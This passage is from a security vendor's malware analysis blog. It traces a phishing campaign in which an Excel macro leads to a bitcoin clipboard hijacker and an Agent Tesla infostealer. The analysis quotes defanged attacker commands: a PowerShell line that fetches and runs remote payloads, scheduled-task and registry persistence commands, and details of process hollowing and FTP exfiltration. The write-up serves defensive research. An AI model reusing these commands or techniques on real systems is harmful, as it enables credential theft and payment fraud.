This malware is](https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&utm_campaign=malware)\nused to hijack bitcoin address information and deliver a new variant of Agent Tesla onto the victim’s\ndevice.\n\nAgent Tesla, first discovered in late 2014, is a known spyware focused on stealing sensitive information\n[from a victim’s device, such as saved application credentials, keyboard inputs (keylogger), etc. We have](https://www.fortinet.com/resources/cyberglossary/what-is-keyloggers.html%20?utm_source=blog&utm_campaign=keylogger)\nposted a number of detailed analysis blogs for Agent Tesla campaign captured by FortiGuard Labs over\n\n\n-----\n\nthe past several year.\n\nInterestingly, Agent Tesla is a commercial software that is sold online, as shown in Figure 1.1, below.\n\nFigure 1.1 - Agent Tesla for sale on a webpage\n\nOn the website shown above, attackers can purchase it anonymously using the payment methods of\n\"Perfect Money\" or \"Bitcoin Payment\".\n\nI conducted research on this latest phishing campaign, and in this post I will share my findings on how\nthe campaign is started, what the Macro within the attached Microsoft Excel does and how it is\nexecuted, as well as how it performs bitcoin address hijack and delivers a new variant of Agent Tesla\nonto the victim’s device.\n\n## Analysis of the Excel File from the Phishing Email\n\nFigure 2.1 – The spam email content\n\nAs you may have noticed in Figure 2.1, the subject has been marked with “SPAM detected by FortiMail”\nto notify the customer that the email is a spam. The email asks the recipient to open the attached\nMicrosoft Excel file to view the details of a document entitled “Order Requirements and Specs.” Once\nthe victim opens the file in Microsoft Excel program, however, a security notice warning pops up, as\nshown in Figure 2.2, because the Excel document contains a Macro.\n\nFigure 2.2 – Warning when opening the attached Excel document\n\nThis is an empty Excel document, whose sheets are hidden. It also contains a password protected VBA\nproject (Macro). I figured this out by modifying its binary data. The VBA project has a predefined\nmethod, Workbook_BeforeClose(), that is automatically called when the victim closes the document.\n\nWhen called, it displays two UserForms with the string “ERROR!” one by one. When the second form is\nclosed, it executes a piece of code loaded from an OptionButton’s tag property. As you can see in\nFigure 2.3, it is about to execute “Shell# UserForm2.OptionButton1.Tag” (where the last \"_\" in Figure\n2.3 is a kind of line-continuation character) to run the command-line command \"mshta\nhxxp://www[.]j[.]mp/ais1kdoaksodjasod14\", which was loaded from the property\n“UserForm2.OptionButton1.Tag”.\n\nFigure 2.3 – Running a command loaded from a property value\n\n“mshta.exe” file is a software component of the Microsoft HTML Application Host, a utility responsible\nfor executing HTA (HTML Application) files in Windows OS. An HTA file is a Microsoft Windows program\nwhose source code consists of HTML, Dynamic HTML, and scripting, such as VBScript or JScript.\n\nThe URL “hxxp://www[.]j[.]mp/ais1kdoaksodjasod14” is redirected to\n“hxxp://bit[.]ly/ais1kdoaksodjasod14” and finally, is redirected to “hxxps://p8hj[.]blogspot[.]com/p/27.html”\n(“27.html”). As you may have guessed, the response from “27.html” contains malicious code, VBScript\ncode for this case, which is encoded by the escape() function.\n\nThere are three segments of VBScript code in the response from “27.html”. Figure 2.4 highlights the\nthree segments of VBScript code that will be decoded and executed within the process “mshta.exe”. In\nthe next section I will demonstrate what the three segments of VBScript code do\n\n\n-----\n\nFigure 2.4 – Three pieces of VBScript code in 27.html\n\n## Three Segments of VBScript Code\n\n**1. Overview of the new Agent Tesla variant, the Auto-Run Group, and Task Scheduler**\n\nFigure 3.1 – Un-escaped the first VBScript code\n\nAfter calling unescape() twice to the first segment of VBScript code, we finally obtain HTML content, as\nshown in figure 3.1. This content contains a piece of VBScript code that performs the three tasks shown\nbelow:\n\n**Downloads PowerShell files to deliver the new Agent Tesla variant**\n\nIt calls the VBScript method MicrosoftWINdows.Run() with the following parameter.\n\n\"cmd /c start /min PowerShell -ex Bypass -nOp -w 1\n;i'E'x(iwr('hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-1.txt') -useB);i'E'x(iwr('\nhxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-2.txt') -useB);i'E'x(iwr('\nhxxps://ia801500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-3.txt') -useB)\"\n\nIt then runs PowerShell to execute three PowerShell files downloaded from three URLs. There are two\nEXE files stored in two huge arrays inside each downloaded PowerShell file.\n\nThe two EXE files are a loader of Agent Tesla and a new variant of Agent Tesla. Below is a segment of\ncode extracted from “27-1.txt” as an example to explain how it loads Agent Tesla.\n\n[Reflection.Assembly]::Load($Cli555).GetType('WpfControlLibrary1.LOGO').GetMethod('Run').Invoke($null,\n\n[object[]] ('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe',$Cli444));\n\nAs you can see, it loads the loader from the array $Cli555, which has a function called\n“WpfControlLibrary1.LOGO.Run()” requiring two parameters. It runs a normal EXE file (“MSBuild.exe”),\nthen deploys the new Agent Tesla variant stored in the huge array $Cli444 into it and executes. This\nmeans Agent Tesla will run within “MSBuild.exe”—which is also a way to protect Agent Tesla from being\ndetected by the victim. I’ll explain the details of “WpfControlLibrary1.LOGO.Run()” later.\n\n**The VBScript code adds numerous items into the Auto-Run group in the system registry**\n\nFigure 3.2 shows a screenshot of the Auto-Run group in the system registry of an infected system. It\ncreates a WMI (Windows Management Instrumentation) Object to add into the Auto-Run group by\ncalling its function “SetStringValue()”.\n\nFigure 3.2 – Auto-run group in system registry\n\n**Creates a scheduled task**\n\nBesides adding items into the Auto-Run group, it adds a scheduled task in “Task Scheduler” to make\nthe entire campaign work effectively.\n\n\n-----\n\nBelow is the code used to run schtasks to create a new scheduled task. The new task name is\n“WIND0WSUPLATE”. Its action is to execute command “mshta\nhxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/27.html” and it’s called every 80\nminutes.\n\nMicrosoftWINdows.run \"schtasks /create /sc MINUTE /mo 80 /tn \\\"WIND0WSUPLATE\\\" /F /tr \\\"MsHtA\\\"\n\\\"hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/27.html\\\"\",0\n\n**2. Hijacking a Bitcoin address on the victim’s device**\n\nAfter being decoded, we then obtained the second piece of VBScript code. Executing it saves a batch of\nPowerShell code into the system registry under the subkey \"HKCU\\Software\\nasdnasndnad\". It also\nadds an item to execute this PowerShell code into the Auto-Run group in the system registry, causing it\nto run at system startup (refer to the item “replcia” in Figure 3.2).\n\nTo do so, it executes the following code.\n\n_MicrosoftWINdows.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\replcia\", \"mshta_\n_vbscript:Execute(\"\"CreateObject(\"\"\"\"Wscript.Shell\"\"\"\").Run \"\"\"\"powershell ((gp_\n_HKCU:\\Software).nasdnasndnad)|IEX\"\"\"\", 0 : window.close\"\")\", EXCELX_\n\nGoing through the PowerShell code we can see it performs a bitcoin address hijack. It does this by\ncontinually detecting the data on the system clipboard. If it’s a valid bitcoin address, it replaces the\nbitcoin address with attacker’s. To do so it uses a “while” statement and a function to check if a string is\na valid bitcoin address. The while statement reads the system clipboard data from time to time by\ncalling Get-Clipboard(). It then calls the function isBitcoinAddress() to determine if the data is a valid\nbitcoin address. If so, it then calls Set-Clipboard() to modify the bitcoin address in the clipboard to the\nattacker’s, which in this case is “19VFGWgBkn6J3kMd8ApfCbtbNUmg8eBMvp”. Figure 3.3 shows\nthe PowerShell code used to hijack a bitcoin address.\n\nFigure 3.3 – Code to hijack a Bitcoin address\n\nUsually, people use the system clipboard to copy or paste the payee’s bitcoin address to make a\npayment. During this time, this bitcoin hijack will change the payee’s bitcoin address to attacker’s. The\nvictim remains unaware that he/she paid their bitcoins to the wrong payee.\n\n**3. Killing All Microsoft Excel and Word Processes**\n\nThe decoded code for this segment is listed below. It runs the “taskkill” command to terminate all\nrunning Microsoft Excel and Word programs. This can force kill the Excel.exe progress executing above\nthe mshta.exe command.\n\n<script language=\"VBScript\">\nCreateObject(\"WScript.Shell\").Run \"taskkill /f /im Excel.exe\", 0\nCreateObject(\"WScript.Shell\").Run \"taskkill /f /im winword.exe\", 0\nwindow.resizeTo 0, 0\nself.close\n</script>\n\n\n-----\n\nAt this point we finished analyzing the first stage of this attack to explain what it is able to do with the\nthree segments of VBScript. Next, I will focus on the analysis of the loader and the new Agent Tesla\nvariant that was started by the first segment of VBScript code.\n\n## Analysis of the Loader Progress of Agent Tesla\n\nAs I mentioned earlier, “mshta.exe” runs three segments of VBScript code in 27.html. The first one\ndynamically loads a .Net EXE (“the loader”) from an array ($Cli555) and calls its\nfunction WpfControlLibrary1.LOGO.Run()to deploy the real Agent Tesla from another array onto the\nMSBuild.exe process.\n\nI manually extracted the loader to a local file and the Run() function is displayed in Figure 4.1 using\ndnSpy debugger.\n\nFigure 4.1 – “WpfControlLibrary1.LOGO.Run()” to load Agent Tesla\n\nThe Run() function obtains the full path of a target process\n('C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe') and the binary data of the Agent\nTesla variant from the second parameter. It then calls another function, PEfX2B8Tl(), to deploy this\nAgent Tesla variant onto the target process. As you can see in Figure 4.1, I have simplified the function\nfor a clearer view.\n\nIt first calls the API function CreateProcess() with CreateFlag 0x4 (CREATE_SUSPENDED) to create a\nsuspended MSBuild.exe process. It then calls a bunch of familiar API functions, such as\nGetThreadContext(), ReadProcessMemory(), NtUnmapViewOfSection(), VirtualAllocEx(),\nWriteProcessMemory(), SetThreadContext(), and ResumeThread(). After that, Agent Tesla runs within\nthe target process “MSBuild.exe”.\n\nTo show you the entire picture of the malicious process that started from the phishing campaign, I have\nattached a screenshot of the Process Tree below, which shows all relevant processes involved in the\ncampaign as well as the relationship between these processes.\n\nFigure 4.2 – Process Tree of all relevant processes of the campaign\n\n## Agent Tesla Running Within MSBuild.exe Process to Steal Data\n\nI extracted this new Agent Tesla variant to a local file from the large array ($Cli444) for static analysis.\n\nAccording to Figure 5.1, below, we can see that this new variant is fully obfuscated, meaning it is able to\nprotect its code from being easily analyzed by security researchers.\n\nThe class names, function names, and variable names are meaningless, as shown in Figure 5.1 (such\nas “A”, “a”, “B”, “b”, “C”, “c” and so on.) For instance, the entry point function of this variant is this—\n“A.b.A()”.\n\nFigure 5.1 – Obfuscated new variant of Agent Tesla\n\nWhen Agent Tesla starts in MSBuild.exe, it first checks to see if there is a duplicate Agent Tesla running.\nIf one is found, it is killed to keep only one instance running at the same time.\n\n\n-----\n\nOnce every time it runs, it steals the credentials of applications (like Web Browsers, FTP clients, IM,\netc.) saved on the infected device and sends the stolen data to the attacker.\n\nAccording to my research, it steals sensitive information from 73 different applications, which can be\ncategorized by their features, as below:\n\n**Web Browsers:**\n\n\"Chrome\", \"Firefox\", \"Edge\", \"Safari\", \"SRWare Iron\", \"CoolNovo\", \"QQ Browser\", \"UC Browser\",\n\"Elements Browser\", \"QIP Surf\", \"Epic Privacy\", \"Amigo\", \"Coccoc\", \"Coowon\", \"Torch Browser\",\n\"Orbitum\", \"Yandex Browser\", \"Sputnik\", \"Chedot\", \"Vivaldi\", \"Iridium Browser\", \"360 Browser\",\n\"Chromium\", \"Opera Browser\", \"Sleipnir 6\", \"Liebao Browser\", \"CentBrowser\", \"Brave\", \"Cool Novo\",\n\"Citrio\", \"Uran\", \"7Star\", \"Kometa\", \"Comodo Dragon\",\"K-Meleon\", \"FALKON\", \"IceCat\", \"Flock\",\n\"WaterFox\", \"PaleMoon\", \"UCBrowser\", \"IceDragon\", \"QQBrowser\", \"SeaMonkey\", \"BlackHawk\",\n\"CyberFox\"\n\n**Email Clients and Messenger Clients:**\n\n\"Postbox\", \"Foxmail\", \"Eudora\", \"Mailbird\", \"Becky!\", \"Opera Mail\", \"Outlook\", \"Thunderbird\", \"eM Client\",\n\"IncrediMail\", \"Claws-mail\", \"The Bat!\", \"Pocomail\"\n\"Psi\", \"Trillian\"\n\n**VPN, FTP Clients and Download Managers:**\n\n\"DownloadManager\", \"jDownloader\", \"OpenVPN\", \"SmartFTP\", \"FTPGetter\", \"WS_FTP\", \"FileZilla\",\n\"CFTP\", \"FTP Navigator\", \"CoreFTP\", \"WinSCP\", \"FlashFXP\"\n\nFigure 5.2 shows the moment it has obtained sensitive data from Mozilla Firefox. This data contains\nuser credentials (UserName and Password), the application name “Firefox”, as well as the URLs where\nthe credentials are saved. The data will then be sent to the attacker with magic flag “PW_”. I will\nelaborate on how the stolen data is sent to the attacker later.\n\nFigure 5.2 – Display of sensitive data stolen from Mozilla Firefox\n\nIt starts a thread function that is used to collect cookies files from some predefined web browsers.\nThese collected cookies files are then compressed into a ZIP archive and sent to the attacker with the\nmagic flag “CO_”. Figure 5.3 is an example of such a ZIP archive, containing the cookies files collected\nfrom Mozilla Firefox and Google Chrome on my test machine.\n\nFigure 5.3 – Tree view of one ZIP archive with collected cookies files\n\nIn addition to what I explained above, it also collects data from the system clipboard and the victim’s\ninputs (the keylogger). It calls the API SetClipboardViewer() to register itself so it is able to receive\nnotice once the clipboard data is changed. It can then obtain and save clipboard data.\n\nThe attacker also enabled the keylogger feature in this variant. It sets a hook on the Windows message\nWH_KEYBOARD_LL (13) by calling the API function SetWindowsHookEx(), so it can receive all\nkeyboard messages when the victim types. Both data collected from the clipboard and through victim’s\ninputs are saved in html format in a global variable. Agent Tesla starts a Timer (being called every 20\nminutes) to check if the global variable has data, and if so, it sends its data to the attacker with the\nmagic flag “KL ”\n\n\n-----\n\nAs shown in Figure 5.4 is an example of the data collected from victim s inputs and the clipboard that\nwere extracted by me when it was sent to the attacker.\n\nFigure 5.4 – Example of collected keylogger and clipboard data\n\nAs you can see, this data contains basic information, including current time, User Name, Computer\nName, OS version, CPU type, and memory capacity. The keylogger data contains application name\n(“Google Chrome”), application title (“New Tab – Google Chrome”), current time (05/21/2021 10:48:18),\nas well as victim’s inputs at the second line. The clipboard data starts with a constant string “Copied\nText:” and clipboard data at the second line.\n\n## Sending Stolen Data to the Attacker\n\nAgent Tesla supports several ways to send stolen data to its C2 server. They are over SMTP to send\ndata to the attacker’s email address, over FTP to send the data to the attacker’s FTP server, and over\nHTTP POST to send the data to attacker’s HTTP server.\n\nThe variant we captured uses FTP protocol’s STOR command (store) to submit the stolen sensitive\ndata.\n\nAgent Tesla has several magic flags to identify what kind of the data is being reported. These are “PW_”\nfor credentials, “CO_” for cookies files, “KL” for keylogger and clipboard, and “SC_” for screenshot (not\nenabled in this variant). The data file name consists of a magic flag, User Name, Computer Name, and\ncurrent time.\n\nFigure 6.1 shows a screenshot of Wireshark displaying the data transportation process in an FTP-Data\npacket (with the magic flag “PW_”), where it contains stolen credentials saved in Firefox and FileZilla.\n\nFigure 6.1 – FTP packet with stolen credentials\n\n## Conclusion\n\nMost attackers like to spread malware in phishing emails. As a result, new phishing campaigns are\ndetected every day by FortiGuard Labs. People should be more careful when opening files attached to\nemail.\n\nThe one I just analyzed not only used a VBScript to hijack the victim’s clipboard but also delivered a\nnew variant of Agent Tesla. In this post I walked through this campaign, beginning with how the\nmalicious Macro inside an attached Microsoft Excel document is executed. I then elaborated on how the\nthree VBScript code segments found in the response from 27.html work to perform a bitcoin address\nhijack and to launch a new variant of Agent Tesla. Next, I demonstrated what applications this variant\ncould steal sensitive data from, and what kind of sensitive data Agent Tesla is interested in, including\nsaved credentials, cookies files of some web browsers, keylogger data, and clipboard data. And finally, I\nintroduced how the stolen data is submitted to the attacker using an FTP-DATA packet.\n\n## Fortinet Protections\n\nFortinet customers are already protected from this Agent Tesla variant with FortiGuard’s Web Filtering,\nAnti-Spamming, and AntiVirus services, as follow:\n\n\n-----\n\nThe related URLs listed in IOCs have been rated as **Malicious Websites by the FortiGuard Web**\nFiltering service.\n\nThe phishing email has been marked as SPAM by FortiMail.
